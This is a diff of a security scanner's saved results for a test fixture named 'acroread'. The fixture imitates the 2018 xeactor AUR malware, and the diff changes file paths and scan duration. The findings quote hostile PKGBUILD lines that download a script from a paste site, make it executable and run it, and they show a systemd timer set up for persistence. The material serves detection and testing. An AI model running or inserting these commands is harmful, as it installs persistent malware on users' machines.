@@ -4,60 +4,60 @@ Scan Results: acroread
 
 [CRITICAL] PASTE-001 Pastebin download
     Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:15
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:15
     Code:     curl https://ptpb.pw/~x -o ~/.x
     Recommendation: Never download code from paste sites - this is a major red flag
     Reference: CWE-506
 
 [CRITICAL] PASTE-001 Pastebin download
     Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:15
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:15
     Code:     curl https://ptpb.pw/~x -o ~/.x
     Recommendation: Never download code from paste sites - this is a major red flag
     Reference: CWE-506
 
 [CRITICAL] PERSIST-002 Systemd timer creation
     Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:26
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:26
     Code:     cat > "${pkgdir}/etc/systemd/system/acroread-update.timer" << EOF
     Recommendation: Timers should be user-controlled; review carefully
     Reference: CWE-506
 
 [CRITICAL] PERSIST-002 Systemd timer creation
     Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:31
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:31
     Code: OnBootSec=60
     Recommendation: Timers should be user-controlled; review carefully
     Reference: CWE-506
 
 [CRITICAL] PERSIST-002 Systemd timer creation
     Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:32
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:32
     Code: OnUnitActiveSec=360
     Recommendation: Timers should be user-controlled; review carefully
     Reference: CWE-506
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:15
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:15
     Code:     curl https://ptpb.pw/~x -o ~/.x
     Recommendation: Packages should not create hidden files in user home
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:16
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:16
     Code:     chmod +x ~/.x
     Recommendation: Packages should not create hidden files in user home
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:19
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:19
     Code:     bash ~/.x
     Recommendation: Packages should not create hidden files in user home
 
 [HIGH] FUNC-001 Network access in build function
     Function 'build' contains network access command 'curl'
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD:13
+    Location: tests/fixtures/malicious/xeactor-style/PKGBUILD:13
     Recommendation: Network access should happen in source= array, not build functions
 
 [MEDIUM] SRC-005 No sources with build function
@@ -68,7 +68,7 @@ Scan Results: acroread
 
 ============================================================
 Package: acroread v2.0.0-1
-Scan duration: 2ms
+Scan duration: 4ms
 
 Found 10 issue(s):
   5 CRITICAL
